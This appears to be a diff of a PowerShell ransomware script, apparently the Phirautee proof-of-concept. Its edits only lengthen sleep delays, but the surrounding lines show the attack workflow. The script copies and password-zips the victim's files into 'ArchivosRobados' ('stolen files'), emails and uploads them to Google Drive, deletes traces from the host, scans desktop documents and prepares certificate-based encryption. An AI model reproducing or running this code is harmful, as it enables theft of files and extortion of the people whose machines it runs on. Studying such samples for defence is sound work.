@@ -46,7 +46,7 @@ Start-Sleep -s 1
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force -Scope CurrentUser
 Install-Module -Name 7Zip4Powershell -RequiredVersion 1.12.0  -Scope CurrentUser -AllowClobber -Force
-Start-Sleep -s 3
+Start-Sleep -s 10
 $IV11 = "v9(nnlZl8rz:d)mok*D=+;Th[:}LN;P5C{Dp64|-AX5U"
 Write-Host "[+] Zipping files!" -ForegroundColor Green
 $NomComputadora = "$env:computername"
@@ -113,7 +113,7 @@ $Msg.Dispose()
 $Mailer.Dispose()
 
 Write-Host "[+] Email Sent!" -ForegroundColor Green
-Start-Sleep -s 1
+Start-Sleep -s 2
 Write-Host "[-] Deleting files" -ForegroundColor Red
 #Remove-Item c:\temp\sys1.txt
 #Remove-Item c:\temp\backup1.zip
@@ -131,7 +131,7 @@ ELSE
 
 #$cp = robocopy /mov $Source $Destination *.txt /s
 $cp = robocopy /E $Source $Destination
-Start-Sleep -s 3
+Start-Sleep -s 5
 
 $files = Get-ChildItem -Path $Destination
 
@@ -144,11 +144,11 @@ Write-Host "[+] Files copied" -ForegroundColor Green
 $ArchivosRobados = "$env:computername-$(get-date -f yyyy-MM-dd)"
 Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\ArchivosRobados-"$ArchivosRobados".zip -Format Zip -Password "$pwd1"
 
-Start-Sleep -s 2
+Start-Sleep -s 5
 Write-Host "[+] Files zipped" -ForegroundColor Green
 #$del = Remove-Item $Destination -Force -Recurse
 Write-Host "[+] Uploading Large Files to G-Drive" -ForegroundColor Green
-Start-Sleep -s 2
+Start-Sleep -s 5
 $del = Remove-Item $Destination -Force -Recurse
 Write-Host "[-] Uploading Large Files Deleted" -ForegroundColor Red
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -217,9 +217,9 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 #$Source = "C:\Users\$env:USERNAME\Desktop\Important"
 #$Source = "C:\temp"
 #$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
-Start-Sleep -s 3
+Start-Sleep -s 10
 Remove-Item c:\temp\ArchivosRobados-"$ArchivosRobados".zip
-Start-Sleep -s 2
+Start-Sleep -s 5
 Write-Host "[-] Stolen file deleted from the host..." -ForegroundColor Red
 Write-Host "[+] Init Phiratee..." -ForegroundColor Green
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -288,9 +288,9 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 #$Source = "C:\Users\$env:USERNAME\Desktop\Important"
 #$Source = "C:\temp"
 #$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
-Start-Sleep -s 3
+Start-Sleep -s 10
 Remove-Item c:\temp\backup-"$NomComputadora".zip
-Start-Sleep -s 2
+Start-Sleep -s 5
 Write-Host "[-] Stolen file deleted from the host..." -ForegroundColor Red
 Write-Host "[+] Init Phiratee..." -ForegroundColor Green
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -359,9 +359,9 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 #$Source = "C:\Users\$env:USERNAME\Desktop\Important"
 #$Source = "C:\temp"
 #$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
-Start-Sleep -s 3
+Start-Sleep -s 10
 Remove-Item c:\temp\backup1-"$NomComputadora".zip
-Start-Sleep -s 2
+Start-Sleep -s 5
 Write-Host "[-] Stolen file deleted from the host..." -ForegroundColor Red
 Write-Host "[+] Init Phiratee..." -ForegroundColor Green
 #----------------------------------------------------------------------------------------------------------------------------------------
@@ -405,13 +405,13 @@ foreach ($i in $(Get-ChildItem $env:USERPROFILE\Desktop -recurse -include *.txt,
 
 $alert = "https://raw.githubusercontent.com/Viralmaniar/Phirautee/master/defcon.jpg"
 Invoke-WebRequest -Uri $alert -OutFile "C:/temp/defcon.jpg"
-Start-Sleep -s 1
+Start-Sleep -s 2
 
 Write-Host "[+] Phiratee Deployed Successfully..." -ForegroundColor Green
 $encodedcert =  [IO.File]::WriteAllBytes("/windows/temp/x.cer", [Convert]::FromBase64String($encodedcert))
 #echo (Protect-CmsMessage -Content $pwd -To "/windows/temp/x.cer") > /users/$env:USERNAME/desktop/encrypted_key.txt
 
-Start-Sleep -s 3
+Start-Sleep -s 10
 #remove-variable pwd
 Write-Host "[+] Intiating UI..." -ForegroundColor Green
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
